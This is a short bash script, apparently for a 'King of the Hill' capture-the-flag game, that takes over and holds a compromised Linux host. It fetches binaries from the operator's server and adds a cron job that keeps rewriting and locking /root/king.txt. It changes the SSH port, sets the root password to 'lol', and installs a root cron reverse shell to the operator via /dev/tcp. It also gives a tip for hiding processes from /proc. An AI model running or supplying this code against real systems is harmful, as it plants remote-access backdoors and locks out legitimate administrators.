#!/bin/bash

rainbow() {
    local text=$1
    echo "$text" #| lolcat -p 0.3 -a -d 1
}

rainbow "please start python server port 80"
sleep 1

read -p "IP: " ip_address
read -p "Port: " port_address

wget http://$ip_address:$port_address/chattr
chmod +x chattr

echo "#!/bin/bash" > /usr/lib/yo.sh
echo "echo 'Ap4sh' > /root/king.txt" >> /usr/lib/yo.sh
echo "/usr/lib/chattr +i /root/king.txt" >> /usr/lib/yo.sh

chmod +x /usr/lib/yo.sh

(crontab -l 2>/dev/null; echo "* * * * * bash /usr/lib/yo.sh") | sudo crontab -

wget http://$ip_address:$port_address/nyancatbinaire
chmod +x nyancatbinaire

rainbow "Now you can nyancat ur ennemies xd"
sleep 1

rainbow "now we will check who's online rn"
sleep 1

w

sleep 5

sed -i 's/Port 22/Port 43522/' /etc/ssh/sshd_config
service sshd restart
systemctl restart sshd

chmod -s /usr/bin/pkexec
chmod 0755 /usr/bin/pkexec

rainbow "ok now check suid and i will patch it"
sleep 2
find / -perm /4000 2>/dev/null
sleep 10
read -p "suid: " suid
chmod -s $(which $suid)

echo -e "lol\nlol" | passwd root

comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip_address/$port_address 0>&1'"
echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null-


rainbow "Script finished, if you wanna hide ur PTS you can do this :"
rainbow "mount -o bind /tmp /proc/PID"

sleep 2

rainbow "You can check in /etc/sudoers if user had any perms also"
sleep 2

rainbow "bye"
sleep 1